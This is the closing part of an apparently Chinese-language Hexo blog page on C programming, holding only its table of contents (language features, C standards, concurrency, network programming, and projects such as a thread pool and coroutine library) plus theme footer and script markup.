href="#%E9%9B%B6%E9%95%BF%E6%95%B0%E7%BB%84"><span class="nav-text">零长数组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E5%A3%B0%E6%98%8E"><span class="nav-text">属性声明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E5%87%BD%E6%95%B0"><span class="nav-text">内联函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-text">内建函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E5%AE%8F"><span class="nav-text">可变参数宏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E5%87%BD%E6%95%B0%E5%90%8D"><span class="nav-text">当前函数名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96"><span class="nav-text">内联汇编</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%B0%E4%BB%A3-C-%E8%AF%AD%E8%A8%80"><span class="nav-text">现代 C 语言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#c99"><span class="nav-text">c99</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c11"><span class="nav-text">c11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c17"><span class="nav-text">c17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c23"><span class="nav-text">c23</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8"><span class="nav-text">线程安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B"><span class="nav-text">异步编程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B"><span class="nav-text">网络编程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E9%94%81%E7%BC%96%E7%A8%8B"><span class="nav-text">无锁编程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%82%E6%AD%A5%E4%BF%A1%E5%8F%B7%E5%AE%89%E5%85%A8"><span class="nav-text">异步信号安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%92%8C%E8%A1%8C%E4%B8%BA%E8%A7%84%E8%8C%83%E9%97%AE%E9%A2%98"><span class="nav-text">代码和行为规范问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#C-%E8%AF%AD%E8%A8%80%E9%A1%B9%E7%9B%AE"><span class="nav-text">C 语言项目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E6%B1%A0"><span class="nav-text">线程池</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%B1%A0"><span class="nav-text">进程池</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%B1%A0"><span class="nav-text">内存池</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%8F%E7%A8%8B%E5%BA%93"><span class="nav-text">协程库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E9%94%81%E7%BC%96%E7%A8%8B%E5%BA%93"><span class="nav-text">无锁编程库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E5%B9%B6%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">高并发服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7"><span class="nav-text">网络视频监控</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TinyBox"><span class="nav-text">TinyBox</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">关山初度尘未洗，策马扬鞭再奋蹄。</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-circle-info fa-beat-fade" style="--fa-beat-fade-opacity: 0.67; --fa-beat-fade-scale: 1.075;" ></i>&nbsp;&nbsp;<a href="/">韩乔落</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        121 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/categoryList.js" ></script>


    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/localSearch.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/lazyload.js" ></script>



    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/runtime.js" ></script>
    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/odometer.min.js" ></script>
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/assets/odometer-theme-minimal.css">



  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/typed.js" ></script>







    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/anime.min.js" ></script>




    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>